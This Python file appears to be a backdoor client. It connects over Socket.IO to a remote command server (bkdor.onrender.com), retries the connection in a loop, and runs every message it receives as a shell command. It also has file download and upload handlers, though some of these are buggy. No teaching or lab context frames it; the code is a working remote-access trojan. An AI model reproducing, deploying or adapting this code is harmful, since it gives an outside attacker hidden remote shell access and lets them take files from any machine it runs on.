import socketio
import os
import subprocess
import json
import time

sio = socketio.Client()
server_url = "https://bkdor.onrender.com/"# "https://aqueous-coast-46687.herokuapp.com/"


def read_file(path):
    with open(path, "rb") as file:
        data = file.read().decode("utf-8")
        file.close()
        return data


def change_directory(path):
    os.chdir(path)
    return f"Changed directory to {os.getcwd()}."


def write_file(file_path, data):
    file_name = os.path.basename(file_path)
    with open(file_name, "wb") as file:
        file.write(data.encode())
        file.close()
        return f"File saved {file_name}"


def execute_system_commands(command):
    try:
        output = subprocess.check_output(f"""{command}""", shell=True)
        return str(output)
    except Exception as error:
        return f"error --> {error}"


def reliable_parse(event):
    return json.loads(event)


def reliable_send(data):
    packed_data = json.dumps(data)
    sio.send(packed_data)


def handle_events(event):
    try:
        if event.split()[0] == "download":
            return read_file(event[1])
        elif event.split()[0] == "upload":
            return write_file(event[1], event[2])
        elif event.split()[0] == "pwd":
            return os.getcwd()
        elif event.split()[0] == "cd":
            print("cddddd")
            return change_directory(event.split()[1])
        else:
            return execute_system_commands(event)
    except Exception as error:
        return f"We encountered an error {error}"


@sio.event
def connect():
    print("I'm connected!")


@sio.event
def connect_error():
    print("The connection failed!")

def connect_to_server():
    while True:
        time.sleep(1)
        try:
            print("trying again")
            sio.connect(server_url)
            print('my sid is', sio.sid)
            break
        except Exception as error:
            print(f"encountered error", error)
            connect_to_server()


@sio.event
def disconnect():
    print("I'm disconnected!")


@sio.on('*')
def catch_all(event):
    output = handle_events(reliable_parse(event))
    reliable_send(output)
    print("event", event, output)


connect_to_server()

while True:
    print("hi")
    time.sleep(5)
# sio.connect('http://localhost:3000')

# import socket
#
#
# class Server:
#     def __init__(self, ip, port):
#         self.ip = ip
#         self.port = port
#         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     def connect(self):
#         try:
#             self.server.connect((self.ip, self.port))
#             print("connected")
#         except Exception:
#             print("error", Exception)
#
# client = Server('localhost', 3000)
# client.connect()